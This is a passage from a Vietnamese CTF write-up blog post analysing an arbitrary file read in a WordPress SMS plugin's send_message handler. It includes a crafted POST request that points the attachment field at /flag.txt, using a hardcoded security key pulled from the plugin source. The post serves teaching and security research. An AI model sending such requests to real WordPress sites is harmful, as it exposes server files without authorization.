</span></span><span class=line><span class=cl>                     <span class=nv>$fullmessage</span> <span class=o>=</span> <span class=nx>apply_filters</span><span class=p>(</span><span class=s1>&#39;jot-send-message-messagetext&#39;</span><span class=p>,</span><span class=nv>$fullmessage</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$member</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$message_type</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-message-type&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                            <span class=k>switch</span> <span class=p>(</span> <span class=nv>$message_type</span>  <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                               <span class=k>case</span> <span class=s1>&#39;jot-sms&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                  <span class=nv>$message_error</span> <span class=o>=</span> <span class=nx>JOTAC_Plugin</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>currentsmsprovider</span><span class=o>-&gt;</span><span class=na>send_smsmessage</span><span class=p>(</span><span class=nv>$member</span><span class=p>[</span><span class=s1>&#39;jot_grpmemnum&#39;</span><span class=p>],</span><span class=nv>$fullmessage</span><span class=p>,</span><span class=nv>$attachment_raw</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                               <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                               <span class=k>case</span> <span class=s1>&#39;jot-call&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                  <span class=nv>$message_error</span> <span class=o>=</span> <span class=nx>JOTAC_Plugin</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>currentsmsprovider</span><span class=o>-&gt;</span><span class=na>send_callmessage</span><span class=p>(</span><span class=nv>$member</span><span class=p>[</span><span class=s1>&#39;jot_grpmemnum&#39;</span><span class=p>],</span><span class=nv>$fullmessage</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                               <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>                     <span class=p>}</span>
</span></span><span class=line><span class=cl>                     <span class=k>if</span> <span class=p>(</span><span class=nv>$message_error</span><span class=p>[</span><span class=s1>&#39;send_message_errorcode&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=c1>//An error occurred sending the message
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=nv>$error</span> <span class=o>=</span> <span class=mi>999</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                     <span class=p>}</span>
</span></span><span class=line><span class=cl>                     <span class=nv>$all_send_errors</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$message_error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>               <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                         <span class=nv>$error</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>               <span class=p>}</span>
</span></span><span class=line><span class=cl>         <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Tại đây có thể thấy được đoạn code</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$attachment_raw</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$attachment_fp</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>có thể tấn công được thông qua <code>file_get_contents()</code> để đọc flag.
Hàm này được sử dụng để đọc nội dung file đính kèm từ đường dẫn <code>$attachment_fp</code>. Nếu chúng ta có thể kiểm soát đầu vào của biến <code>$mess_attachment</code>, việc chỉ định một file cụ thể, như <code>/flag.txt</code>, sẽ cho phép hệ thống đọc nội dung của file đó thông qua <code>file_get_contents()</code>.</p><h3 id=phân-tích-lỗ-hổng-trong-hàm-send_message_callback-và-khai-thác-qua-file_get_contents>Phân tích lỗ hổng trong hàm <code>send_message_callback()</code> và khai thác qua <code>file_get_contents()</code><a hidden class=anchor aria-hidden=true href=#phân-tích-lỗ-hổng-trong-hàm-send_message_callback-và-khai-thác-qua-file_get_contents>#</a></h3><p>Dữ liệu từ <code>$_POST['formdata']</code> được xử lý bằng các hàm như <code>sanitize_textarea_field()</code> và <code>sanitize_text_field()</code>, bao gồm giá trị <code>mess_attachment</code>. Hệ thống kiểm tra xem file đính kèm có tồn tại trong thư mục <code>/attachments/</code> và có định dạng hợp lệ hay không. Tuy nhiên, nếu chỉ định một đường dẫn trực tiếp đến file nhạy cảm như <code>/flag.txt</code>, hàm <code>file_get_contents()</code> vẫn có thể đọc được nội dung của file này nếu nó tồn tại trên hệ thống.</p><p>Sau khi nội dung file được đọc, nếu xảy ra lỗi trong quá trình gửi tin nhắn, chẳng hạn do nhà cung cấp dịch vụ SMS, hệ thống sẽ trả về thông báo lỗi chứa thông tin về file vừa đọc. Lỗ hổng này tạo ra cơ hội để trích xuất thông tin nhạy cảm từ file mà không cần phải vượt qua các rào cản bảo mật khác.</p><p>Chúng ta có thể khai thác bằng cách gửi một yêu cầu POST tới hệ thống với giá trị <code>mess_attachment</code> trỏ trực tiếp đến file <code>/flag.txt</code>. Nếu có lỗi phát sinh trong quá trình gửi tin nhắn (như trong trường hợp nhà cung cấp dịch vụ SMS không khả dụng), nội dung của file flag sẽ được trả về dưới dạng một phần của thông báo lỗi. Bằng cách này, chúng ta có thể dễ dàng đọc được flag mà không cần phải vượt qua các kiểm tra file loại bỏ thông thường.</p><h3 id=khai-thác>Khai thác:<a hidden class=anchor aria-hidden=true href=#khai-thác>#</a></h3><ol><li><p>Gửi yêu cầu với <code>mess_attachment</code> trỏ đến file flag <code>/flag.txt</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>POST /wp-admin/admin-ajax.php?action=send_message
</span></span></span><span class=line><span class=cl><span class=err>Content-Type: application/x-www-form-urlencoded
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>formdata=jotac-plugin-messages[jot-message]=test_message&amp;jotac-plugin-messages[jot-message-type]=jot-sms&amp;jotac-plugin-messages[jot-attachment]=/flag.txt&amp;sec=6AGmIzDZktwJCaQt
</span></span></span></code></pre></td></tr></table></div></div><p>Với giá trị <code>sec</code> được lấy từ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-jotac.php data-lang=jotac.php><span class=line><span class=cl> public function __construct () {
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     $this-&gt;product = &#34;JOTAC SMS&#34;;						
</span></span><span class=line><span class=cl>     $this-&gt;token = &#39;jotac-plugin&#39;;
</span></span><span class=line><span class=cl>     $this-&gt;key = &#39;6AGmIzDZktwJCaQt&#39;;
</span></span><span class=line><span class=cl>     $this-&gt;version = &#39;4.0.0&#39;; 
</span></span><span class=line><span class=cl>     $this-&gt;debug = false;			
</span></span></code></pre></td></tr></table></div></div></li><li><p>Khi xảy ra lỗi trong quá trình gửi tin nhắn (trong <code>case 'jot-sms'</code>), nội dung của file flag được lưu trong <code>$attachment_raw</code> sẽ xuất hiện trong phản hồi lỗi trả về từ server.</p></li></ol><p>Phần tiếp theo bạn đọc đọc tại đây <a href=https://viblo.asia/p/writeup-patchstack-wcus-ctf-obA46w1BJKv>https://viblo.asia/p/writeup-patchstack-wcus-ctf-obA46w1BJKv</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/writeup/>WriteUp</a></li><li><a href=https://minhtuanact.github.io/tags/ctf/>CTF</a></li><li><a href=https://minhtuanact.github.io/tags/contentcreator/>ContentCreator</a></li></ul><nav class=paginav><a class=next href=https://minhtuanact.github.io/posts/mot-vai-nhung-vulnerable-gan-day-cua-whatsup-gold/><span class=title>Next »</span><br><span>Một vài những vulnerable gần đây của Whatsup Gold</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on twitter" href="https://twitter.com/intent/tweet/?text=Writeup%20Patchstack%20WCUS%20CTF&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f&hashtags=WriteUp%2cCTF%2cContentCreator"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f&title=Writeup%20Patchstack%20WCUS%20CTF&summary=Writeup%20Patchstack%20WCUS%20CTF&source=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f&title=Writeup%20Patchstack%20WCUS%20CTF"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on whatsapp" href="https://api.whatsapp.com/send?text=Writeup%20Patchstack%20WCUS%20CTF%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on telegram" href="https://telegram.me/share/url?text=Writeup%20Patchstack%20WCUS%20CTF&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>